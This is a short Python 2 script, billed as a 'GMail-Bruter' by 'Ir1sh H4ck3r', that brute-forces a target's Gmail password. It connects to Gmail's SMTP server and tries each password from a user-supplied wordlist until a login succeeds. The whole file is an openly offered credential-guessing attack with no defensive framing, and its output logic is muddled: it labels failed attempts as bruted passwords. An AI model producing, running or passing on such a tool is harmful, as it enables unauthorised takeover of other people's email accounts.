import smtplib
from os import system
def hell():
                    mawar = "\033[31;m1"
                    susu1 = "\033[37;1m"
                    hole1 = "\033[32;1m"

                    print '+-----------------------------------------+'
                    print "|         Scripted by: Ir1sh H4ck3r       |"
                    print "+-----------------------------------------+"
                    print "|         GMail-Bruter Python Script      |"
                    print "+-----------------------------------------+\n"

hell()
mawar = "\033[31;1m"

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(mawar+"-->[!] Enter Targets GMail: ")
passwd = raw_input(mawar+"-->[!] Path and Name Wordlist: ")
passwd = open(passwd, "r")

for password in passwd:
    try:
                            smtpserver.login(user, password)
                            system("clear")
                            hell()
                            print mawar+"\n"
                            print mawar+"-->[!] Password Detected :" + password
                            break
    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print "\n"
                            print mawar+"-->[!] Password Bruted!:" + password
                            break
                else:
                        print mawar+"-->[!] Password Bruted!:" + password
